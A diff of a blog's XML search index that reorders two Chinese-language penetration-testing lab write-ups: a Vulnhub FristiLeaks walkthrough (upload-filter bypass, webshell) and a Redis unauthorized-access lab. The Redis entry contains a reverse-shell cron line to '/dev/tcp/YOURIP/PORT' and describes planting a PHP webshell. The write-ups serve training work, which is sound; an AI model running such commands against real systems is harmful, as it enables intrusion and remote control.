@@ -109,18 +109,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Vulnhub FristiLeaks]]></title>
-    <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
-    <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
-      <categories>
-        <category>Challenge</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[redis未授权访问]]></title>
     <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
     <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
@@ -130,6 +118,18 @@
       <tags>
         <tag>Web</tag>
         <tag>redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Vulnhub FristiLeaks]]></title>
+    <url>%2F2018%2F10%2F02%2FVulnhub-FristiLeaks%2F</url>
+    <content type="text"><![CDATA[A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. 0x01 开始前的准备环境下载https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrenthttps://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova 配置环境VMware users will need to manually edit the VM’s MAC address to: 08:00:27:A5:A6:76也就是把VMware的MAC地址调为08:00:27:A5:A6:76，之后开启虚拟机即可 0x02 扫描首先使用Nmap进行扫描 只有80端口开启，nmap扫描下80端口 可以看到robots文件存在，并有三个目录存在 访问192.168.1.5，除了一张图片，基本上没有什么了 robots.txt里的三个页面打开后是同一张图片，看来是毫无用处了，用御剑扫了下目录发现images文件夹,基本没用 0x03 获得Shell最后回到主页的图片上来，fristi，题目好像也有这个，于是试了下fristi 弱口令失败，看下源代码想找找有没有什么东西 Great 先将base64解码，出现PNG字样，用base64转图片 得到一串字符，尝试登陆： 正好第一处tip中有个名字，尝试登陆 进入上传页面 在namp扫描时发现服务器为Apache Linux所以尝试下多重后缀名 上传成功，用菜刀连接 0x04 提升权限正在骑马赶来的路上……]]></content>
+      <categories>
+        <category>Challenge</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
